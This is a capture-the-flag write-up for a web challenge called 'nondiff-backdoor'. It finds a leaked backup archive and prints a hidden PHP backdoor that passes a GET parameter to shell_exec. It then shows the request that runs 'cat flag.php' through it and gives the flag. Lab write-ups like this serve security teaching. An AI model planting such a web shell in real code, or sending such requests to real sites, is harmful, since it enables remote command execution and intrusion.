nondiff-backdoor 
Category: Web  

Description: Our website has been breached multiple times. Now we even found a backup.zip in a public path and still can not find the backdoor.  
Flag format: ctf{sha256}  

Link to the challenge: https://app.cyber-edu.co/challenges/98d79d7d-9586-438d-aa7f-f87a1a7a7666?tenant=unbreakable

In this ctf, we need to find the shell_exec php function in the backup.zip file and exploit it.  

Firstly, I used dirsearch to list all the accessible entry points, and here i found backup.zip.

<img width="1020" height="409" alt="image" src="https://github.com/user-attachments/assets/694cd783-2ff0-4597-8423-320832db75a5" />

I just entered `http://34.40.82.22:32657/backup.zip` and the backup.zip file started downloading.

After unzipping the file, I needed to search the shell_exec function and how to call it and use it to read the flag.  
I could do it easily using grep.

`grep -r 'shell_exec'`

And after a couple of seconds I could see the function. But I needed to see the whole function. I added the `-C 3` option to the grep command and now I can see the whole function:

`function sentimental_function() {`  
`  If ($_GET['welldone'] == 'knockknock') {`  
`    echo shell_exec($_GET['shazam']);`  
`  }`  
`}`

And this is all I need to exploit this site. I entered `/?welldone=knockknock&shazam=cat%20flag.php`, and the whole query should look like this:  

`http://34.40.82.22:32657/?welldone=knockknock&shazam=cat%20flag.php`  

I couldn't see the flag on the page, and I tried to look to the HTML source code, by pressing CTRL+U, and scrolling down a little bit, I could see the flag.

Flag: `CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}`
